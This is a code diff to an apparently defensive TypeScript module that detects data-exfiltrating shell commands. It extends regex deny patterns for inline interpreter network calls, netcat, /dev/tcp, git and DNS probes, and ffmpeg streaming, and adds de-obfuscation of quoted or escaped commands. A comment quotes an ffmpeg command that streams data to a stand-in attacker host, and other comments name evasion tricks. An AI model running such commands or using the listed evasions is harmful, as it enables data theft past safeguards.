@@ -145,11 +145,11 @@ const EGRESS_COMMAND_PATTERNS: Array<{ re: RegExp; label: string }> = [
   //  · nc/telnet 要求「命令词 + 主机 + 端口」，避免 `grep -rn nc src/`、`grep ftp docs` 误判；
   //  · 覆盖 `require('https').request`、`WebSocket`、`undici`、`dgram`、`System.Net.*`、`Start-BitsTransfer`。
   // 已知边界（如实）：`node app.js` 里自己写 fetch 的脚本，静态词表看不见——这类靠沙箱/审计兜底。
-  { re: /\bnode\b[^\n]*?(?:\s-e\s|\s-p\s|--eval\b|--print\b)[^\n]*?(?:\bfetch\b|\bwebsocket\b|\.request\s*\(|\.get\s*\(|\.post\s*\(|createsocket|\bdgram\b|\bundici\b|\baxios\b|\bnet\.)/i, label: 'node 网络请求（内联代码）' },
+  { re: /\bnode\b[^\n]*?\s-[a-z]*[ep][a-z]*\s*[^\n]*?(?:\bfetch\b|\bwebsocket\b|\.request\s*\(|\.get\s*\(|\.post\s*\(|createsocket|\bdgram\b|\bundici\b|\baxios\b|\bnet\.|\btls\b)/i, label: 'node 网络请求（内联代码）' },
   { re: /require\(\s*['"]https?['"]\s*\)/, label: 'node 网络请求（require http/https）' },
-  { re: /\b(deno|bun)\b[^\n]*?(?:\s-e\s|--eval\b|run\b)[^\n]*?(?:\bfetch\b|\bwebsocket\b|\bconnect\b)/i, label: 'deno/bun 网络请求' },
+  { re: /\b(deno|bun)\b[^\n]*?(?:\s-[a-z]*e[a-z]*\s*|--eval\b|\beval\b|\brun\b)[^\n]*?(?:\bfetch\b|\bwebsocket\b|\bconnect\b)/i, label: 'deno/bun 网络请求' },
   {
-    re: /\b(?:python|python3|py)\b[^\n]*?\s-c\s[^\n]*?(?:requests|httpx|urllib|socket|aiohttp|http\.client|ftplib|smtplib)/i,
+    re: /\b(?:python|python3|py)\b[^\n]*?\s-c\s*[^\n]*?(?:requests|httpx|urllib|socket|aiohttp|http\.client|ftplib|smtplib)/i,
     label: 'python 网络请求（内联代码）',
   },
   { re: /\bnet\.(?:webclient|httpclient|webrequest|tcpclient|udpclient|http|sockets|dns)\b/i, label: '.NET 网络请求' },
@@ -160,19 +160,44 @@ const EGRESS_COMMAND_PATTERNS: Array<{ re: RegExp; label: string }> = [
   { re: /(?:^|[\s;&|("'`/\\])(?:nc|ncat|netcat|telnet)\s+\S+\s+\d{1,5}\b/i, label: 'nc/telnet' },
   { re: /\bftp:\/\//i, label: 'ftp 外发' },
   { re: /\bopenssl\s+s_client\b|\bsocat\b/i, label: 'openssl/socat' },
+  // 同向复核 P1-2 补：其它脚本语言的内联外发、git 远程读写、DNS/ICMP 探测（都能带走数据）。
+  { re: /\bphp\b[^\n]*\s-r\s[^\n]*(?:file_get_contents|fsockopen|curl_|stream_socket)/i, label: 'php 网络请求' },
+  { re: /\bruby\b[^\n]*\s-e[\s]*[^\n]*(?:net::http|open-uri|socket|httparty)/i, label: 'ruby 网络请求' },
+  { re: /\bperl\b[^\n]*\s-e[\s]*[^\n]*(?:lwp|http::|io::socket)/i, label: 'perl 网络请求' },
+  { re: /\bgit\s+(?:clone|fetch|ls-remote|pull)\b/i, label: 'git 远程读写' },
+  { re: /\b(?:ping|nslookup|dig|host)\s+[a-z0-9-]+(?:\.[a-z0-9-]+)+\b/i, label: 'DNS/ICMP 探测' },
   { re: /\/dev\/tcp\/|\/dev\/udp\//, label: 'bash /dev/tcp' },
   // S2（2026-11-09 安全复核实抓）：**内置 ffmpeg 本身就是外发客户端**——我们把随包 ffmpeg 前置进
   // PATH，`ffmpeg -i x -f mpegts udp://attacker:9999` 就能外发，而词表当时不含 ffmpeg。
-  // 只拦「网络协议/流式封装」用法；本地转码（ffmpeg -i a.png ... b.png）不受影响。
-  { re: /\bff(?:mpeg|probe)\b[^\n]*(?:\b(?:udp|tcp|rtmp|rtmps|srt|rtsp|gopher|ftp|http|https):\/\/|\s-listen\b|-f\s+(?:mpegts|rtmp|srt|udp|hls|flv)\b)/i, label: 'ffmpeg 网络流' },
+  // 换方向复核 P1-2 补：rtp/sap 协议、`-f rtp|rtp_mpegts|sap`、`file://<host>/`、UNC 路径；
+  // 同时去掉对本地 `-f mpegts|flv|hls` 的误伤（本地转码不该弹卡）。
+  {
+    re: /\bff(?:mpeg|probe)\b[^\n]*(?:\b(?:udp|tcp|rtmp|rtmps|srt|rtsp|rtp|sap|gopher|ftp|http|https):\/\/|file:\/\/[^/\s\\]|\\\\[a-z0-9._-]+\\|\s-listen\b|-f\s+(?:rtp|rtp_mpegts|sap)\b)/i,
+    label: 'ffmpeg 网络流',
+  },
 ];
 
-/** 返回命中的外发命令族标签；无 → null（纯函数，可测）。 */
+/**
+ * 去 shell 混淆：删掉引号/反斜杠/脱字符/多余空白后再匹配。
+ * 换方向复核 P1-1（2026-11-09）实抓：`c\url`、`"cur"l`、`c^url` 在 bash 里执行的就是 curl，
+ * 但字面匹配看不见。变量展开（`$C$U`）与 base64 解出来的内容仍看不见——那是词表方法的边界
+ * （见 backlog 附录 B-14 SEC-EGRESS-1）。
+ */
+export function normalizeShellObfuscation(command: string): string {
+  return (command ?? '')
+    .replace(/["'`^\\]/g, '')
+    .replace(/\s+/g, ' ')
+    .trim();
+}
+
+/** 返回命中的外发命令族标签；无 → null（纯函数，可测）。原文与去混淆文本**都**匹配。 */
 export function detectEgressCommand(command: string): string | null {
   const text = command ?? '';
   if (text.trim().length === 0) return null;
+  const normalized = normalizeShellObfuscation(text);
   for (const { re, label } of EGRESS_COMMAND_PATTERNS) {
-    if (re.test(text)) return label;
+    // 去掉引号后 regex 里的引号分支仍可命中；`\b` 语义不受影响（词边界只跟字符类有关）。
+    if (re.test(text) || re.test(normalized)) return label;
   }
   return null;
 }
